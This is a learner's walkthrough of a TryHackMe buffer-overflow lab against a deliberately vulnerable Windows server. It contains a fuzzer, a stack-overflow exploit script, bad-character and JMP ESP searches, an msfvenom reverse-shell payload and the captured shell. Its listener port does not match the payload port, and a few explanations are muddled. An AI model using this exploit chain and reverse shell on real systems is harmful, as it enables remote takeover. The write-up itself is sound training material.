# Buffer Overflow Prep [TryHackMe]

<sub>_As an aspiring Red Teamer this room is quite important to me as it touches on important low level topics that I don't understand. The room's introductory section states that it doesn't teach buffer overflows from scratch, which is a bummer, but I will try to use Gen AI to possibly make sense of every single bit and piece of this walkthrough and include it in this document. This entire document will be structured based on the THM room's structure. I will link to all possible docs I can find around this and will try to include a list of references at the end._</sub> 

## _OVERFLOW 1_

First we need to use RDP to use the Immunity Debugger on a remote Windows machine: 

```
xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea /tls-seclevel:0
```

Once we're in: 

- Right click __Immunity Debugger__ shortcut on desktop,
- Click __Run as administrator__,
- Click __open file__ icon,
- Navigate to `C:\Users\admin\Desktop\vulnerable-apps\oscp\oscp.exe` and open it,
- Click __Debug > Run__.

Once the binary runs it will start listening on `localhost:1337` so it's what's called a __server application__. On our local machine, let's try to connect to it:

```
nc MACHINE_IP 1337
```

The output of this command reads:

```
Welcome to OSCP Vulnerable Server! Enter HELP for help.
```

Let's enter `HELP`. It appears, that we can write commands for testing purposes in here. Let's type `OVERFLOW 1 test`. The output should be:


```
OVERFLOW1 COMPLETE
```

This basically gives us a lever to send test strings to this port and see if it receives any. Each overflow in the list renders a different response if we perform the task on it.

### Mona Configuration

This room utilizes a Python script called `mona` to automate some searches for debugging. The latest version can be downloaded [here](https://github.com/corelan/mona). 

To configure mona in Immunity Debugger we need to input the following command at the bottom of the application window: 

```
!mona config -set workingfolder c:\mona\%p
```

This sets workingfolder for mona at `c:\mona\%p`. 
### Fuzzing

After this we need to create a Python fuzzer to send increasingly long strings to MACHINE_IP:1337 to see what length of a string will crash the server. I will include the `fuzzer.py` from the room and try to add my own comments to it:

```python3
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.167.75"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
    try:
        '''
        socket.STREAM creates a TCP socket, 
        while socket.AF_INET indicates IPv4 
        address family.
        Using with statement ensures that the
        socket will be properly closed when done.
        '''
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)
```

Now let's run it and see what it does:

```
python3 fuzzer.py
```

The fuzzer crashed the server at __2000__ bytes. 

### Crash Replication & Controlling EIP

Now we will try to replicate this crash and control the EIP with a Python script, which will:

* Send various inputs to reproduce the application crash caused by a buffer overflow (this confirms the existence of buffer overflow).
* Overwrite the __EIP__ (Extended Instruction Pointer) register to redirect the program's execution to malicious code placed in memory.

For that we need to create the following __`exploit.py`__:

```python3
#!/usr/bin/env python3
import socket

ip = "10.10.86.126"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")
```

* `prefix`: This is the string that the vulnerable application expects to receive at the start. It’s commonly used to identify the exploit, such as `"OVERFLOW1 "` in this case.

* `offset`: This is the length of the buffer you want to send before reaching the point where you want to control the EIP. offset would be the number of "A"s (or other characters) needed to fill the buffer up to the return address, which in this case is set to 0 (indicating no overflow yet).

* `overflow`: This would normally be filled with "A"s (or other characters) to reach the part of the memory where EIP resides. Since offset is 0, no overflow is added at this point. If you were conducting an actual buffer overflow, this would be a string of "A"s to fill up the space up to the point where the EIP register would be overwritten.

* `retn`: This is the return address that would be used to redirect the program flow to your shellcode or any other target. This part is empty here, but in a real exploit, you'd typically fill this with the address of your shellcode or a jump instruction to redirect the flow.

* `padding`: Often, additional padding is used to ensure that you have the exact right length to overwrite EIP and ensure that no extra data is inadvertently included. It’s empty here, but this can be used to align memory.

* `payload`: This is the malicious code (shellcode) that you want to execute once you’ve overwritten the EIP with the correct return address. It’s empty here, but in a real-world scenario, it would contain the shellcode (for example, a reverse shell payload or a bind shell).

* `postfix`: Any extra data that might be appended after the payload. It’s not used in this example but could be used to further manipulate the vulnerable program or to terminate the input.

So first we will generate a cyclic pattern of length: `number bytes that crashed the server + 400`. As far as I can tell, this extra 400 is needed to make sure that the full buffer has room to overwrite EIP and surrounding memory to prevent accidental truncation:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
```

We copy the resulting output into the `payload` variable of our `exploit.py` script:

```
...
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7 ... Db3Db4Db5Db6Db7Db8Db9"
postfix = ""
...
```

Now on Windows in Immunity Debugger we need to reopen the `oscp.exe` binary and run it again.

After that we need to run the exploit script:

```
python3 exploit.py
```

This script will help us determine how many bytes it took to overflow the buffer and __start__ overwriting EIP register. This variable is named __`offset`__. To find out in Immunity Debugger input the following `mona` command:

```
!mona findmsp -distance 2400
```

The resulting output is:

```
EIP contains normal pattern : 0x6f43396e (offset 1978)
```

This means out of 2400 total bytes we've generated and sent, the 1979th byte in the overall string was the first one to enter the EIP register. The following output:

```
ESP (0x0199fa30) points at offset 1982 in normal pattern (length 418)
EBP contains normal pattern : 0x43386e43 (offset 1974)
EBX contains normal pattern : 0x376e4336 (offset 1970)
```

Tells us that the first in line was EBX, with offset 1970, next was EBP with offset 1974, after which came EIP and finally ESP with offset 1982. Each of these has a space of 4 bytes and all of them were overwritten.

We need to append the EIP offset (1978) to our `exploit.py:

```
offset = 1978
```

Now that we know the offset value to EIP register, we no longer need a payload of cyclic pattern, we can try to overwrite EIP directly by adding value to `retn` variable:

```
retn = "BBBB"
```

Because `offset` is not 1978. `overflow` becomes `"A" * 1978` thereby filling 1978 initial bytes before EIP register gets overwritten. After the exploit is successfully run, the EIP register should show `42424242` which is hexadecimal for `BBBB`.

Go to Immunity Debugger restart the `oscp.exe` and run the `exploit.py` again:

```
python3 exploit.py
```

Here's the output from CPU registers pane in the Immunity Debugger:

```
EAX 019BF268 ASCII "OVERFLOW1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ECX 00575534
EDX 00000A0D
EBX 41414141
ESP 019BFA30 ASCII "
"
EBP 41414141
ESI 00000000
EDI 00000000
EIP 42424242
```

Here we can see that EBX and EBP were both overwritten with `AAAA` or in hexadecimal `41414141`, EIP was overwritten with `BBBB` or `42424242` and ESP wasn't affected, because the rest of our string (everything after `retn` variable) was empty.

### Finding Bad Characters

Now what we did here is called "Controlling EIP" and now that we have achieved that, we need to find bad chars. Bad chars need to be found for a number of reasons. Not all bytes are treated equally by some applications. For example `\x00` or the null byte is perceived by many functions as a string terminator. This is the most prominent example of a bad character.

If the payload has bad characters in it might be truncated (cut off early), modified or its encoding might break. Before controlling the EIP bad chars don't matter much, it's only after it's overwritten (`retn` variable) we need to make sure that our payload (`payload` variable) arrives unmodified. 

To achieve this we need to generate a byte array, that contains a full set of bytes excluding null byte. We need to do this with `mona` first to make it easier to search for bad chars:

```
!mona bytearray -b "\x00"
```

Now we need to replicate the exact same byte sequence for our string that we will subsequently send to the server. Access python3 shell and input the following print statement:

```
python3
print(''.join(f"\\x{x:02x}" for x in range(1, 256)))
```

Or better yet, use bash:

```
printf '\\x%02x' {1..255}
```

We need to copy the output and add it to the `payload` variable in `exploit.py`:

```
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09 ... xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

Now restart `oscp.exe` binary in Immunity Debugger and run the exploit again. We need to copy the address that ESP register points to:

```
0197FA30
```

Because our generated bytearray was sent after the `retn` variable which overwrites `EIP` completely, which means that the bytearray starts at `ESP`. 

So to compare bytearrays and figure out which ones are bad, we need to run the following `mona` command:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0197FA30
```

The following bad chars were identified:

```
00 07 08 2e 2f a0 a1
```

In some cases bad chars cause the following bytes to get corrupted as well. So in this case `08` ( as a following byte to `07`), `2f` and `a1` might not be corrupted. We can figure it out, by regenerating new byte array excluding the chars, but including the `\x08\x2f\xa1`:

```
!mona bytearray -b "\x00\x07\x2e\xa0"
```

And in bash:

```
printf '\\x%02x' $(seq 1 255 | grep -Ev '^(7|46|160)$')
```

Insert the output into `payload` variable instead of what is there, rerun `oscp.exe` in Immunity Debugger and run the `exploit.py` again.

Then run `!mona compare` command with the appropriate memory address. It returns:

```
Message=[+] Comparing with memory at location : 0x019bfa30 (Stack)
Message=!!! Hooray, normal shellcode unmodified !!!
```

In this case we correctly assumed that all __following__ characters that were in sequence to others were corrupted by bad chars, but usually the best practice is to reiterate this process byte-by-byte, excluding one byte after another and running it that way.

### Finding a Jump Point

Finding a jump point is about finding a `jmp esp` instruction in the `oscp.exe` binary. This instruction jumps directly to the address which is stored in the ESP register. Assuming our shellcode is stored at that address (`payload` variable) `jmp esp` will directly execute it. What we need to do: 

* Find the memory address of `jmp esp` instruction.
* Overwrite EIP with that memory address.
* Overwrite ESP with the memory address of our shellcode. 

To find the memory address of `jmp esp` instruction we need to run the following `mona` command:

```
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```

We need to find address free of bad chars, otherwise the memory address `mona` finds might be corrupted during the overflow.

This command has returned 9 pointers with addresses. I'll use the first one in my `retn` variable:

```
625011AF
```

Since the system is little endian, we need to reverse the byte sequence:

```
retn = "\xAF\x11\x50\x62"
```

### Generate Payload

Now we need to generate a legitimate payload to work with this exploit. In this case we choose `msfvenom` to generate `windows/shell_reverse_tcp`:

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```

`EXITFUNC=thread`: Ensures that when the shell exits, it doesn’t crash the process.
`-b "\x00\x07\x2e\xa0"`: Exclude bad characters (including `\x00` which terminates strings early).
`-f c`: Format the payload as a C-style byte array (needed for the exploit script).

We need to add generated payload to the `payload` variable in our `exploit.py`, like so:

```
payload = ("\xda\xd2\xd9\x74\x24\xf4\x5e\xbd\xdd\xb8\x32\x12\x33\xc9"
"\xb1\x52\x83\xee\xfc\x31\x6e\x13\x03\xb3\xab\xd0\xe7\xb7"
...
"\xca\xd5\xcc\x15\x53\xbc\x6c\x78\x64\x6b\xb2\x85\xe7\x99"
"\x4b\x72\xf7\xe8\x4e\x3e\xbf\x01\x23\x2f\x2a\x25\x90\x50"
"\x7f")
```

### Prepend NOPs

NOP is a __No Operation__ byte, it tells CPU to do nothing. If the shellcode is encoded to bypass security mechanisms, it will need more space to unpack itself. That might cause the shellcode to end up in an unexpected place in memory, which is why ESP will be overwritten with an array of NOPs __followed by__ the shellcode, so that the CPU follows the NOPs directly to it:

```
padding = "\x90" * 16
```

### Exploit

Now we only need to restart `oscp.exe` in Immunity Debugger, but this time we start a netcat listener on our host machine, before we run the `exploit.py` again:

```
nc -lvnp 9822
```

And we got the shell:

```
nc -lvnp 9822
listening on [any] 9822 ...
connect to [10.11.100.243] from (UNKNOWN) [10.10.188.234] 49286
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp> whoami
 whoami
oscp-bof-prep\admin
```
